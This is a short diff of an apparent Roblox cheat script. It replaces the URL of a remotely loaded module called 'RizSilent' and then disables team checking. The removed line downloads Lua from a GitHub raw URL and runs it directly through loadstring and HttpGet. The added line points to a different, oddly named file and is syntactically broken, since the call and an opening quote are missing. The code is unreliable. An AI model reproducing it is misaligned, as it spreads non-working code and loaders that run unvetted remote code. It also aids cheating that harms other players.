@@ -1,4 +1,4 @@
-local RizSilent = loadstring(game:HttpGet("https://raw.githubusercontent.com/rizating/RIZ/main/Module.lua", true))()
+local RizSilent = https://raw.githubusercontent.com/d6monic/whatintheworld/main/laughing2you.txt", true))()
 RizSilent.TeamCheck(false)
 
 local Workspace = game:GetService("Workspace")
